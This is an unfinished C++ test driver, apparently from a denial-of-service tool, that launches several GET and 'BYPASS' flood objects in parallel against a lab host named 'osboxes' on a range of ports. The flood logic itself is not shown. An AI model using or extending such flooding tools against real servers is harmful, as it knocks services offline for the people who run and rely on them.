#include "threadmaster/include/masters/threadmasters.h"

int main()
{
	// -- UNFINISHED -- //
	
	//TODO: Wrap into a Client class responsible for loading and preparing attack
	 
	static const string ip1 = "osboxes";//"192.168.56.1";
	static const int port1 = 65123;

     cout << "test_parallelboostfiber_run" << endl;


	vector<Flood*> floodsPtrs;
    vector<Flood*>* pFloodsPtrs = &floodsPtrs;
	
    int n = 0;
    //for(int i = 0; i < 5; i++)
	{
		cout << "making " << ip1 << endl;
		Flood* flood0 = new GET(ip1, port1 + n++); 		    floodsPtrs.push_back(std::move(flood0));
        Flood* flood1 = new GET(ip1, port1 + n++);		    floodsPtrs.push_back(std::move(flood1));
		Flood* flood2 = new BYPASS(ip1, port1 + n++);		    floodsPtrs.push_back(std::move(flood2));
		Flood* flood3 = new BYPASS(ip1, port1 + n++);		    floodsPtrs.push_back(std::move(flood3));
		Flood* flood4 = new GET(ip1, port1 + n++);		    floodsPtrs.push_back(std::move(flood4));
				
        //if(flood::State::READY == flood->getState())
		//    floodsPtrs.push_back(std::move(flood));
	}

	cout <<"size floods" << floodsPtrs.size() << endl;
	for(auto f : floodsPtrs)
		cout << f->getTarget()->getAddress() << endl;

    int n_threads = 2;
    ParallelBoostFiber runner(pFloodsPtrs, n_threads);
    
    cout << "ParallelPosix.getState() = " << runner.getState() << endl;
    cout << "ParallelPosix.getType() = " << runner.getType() << endl;
    
    cout << "ParallelPosix.start() = " << endl;    
    runner.start();


	return 0;
}


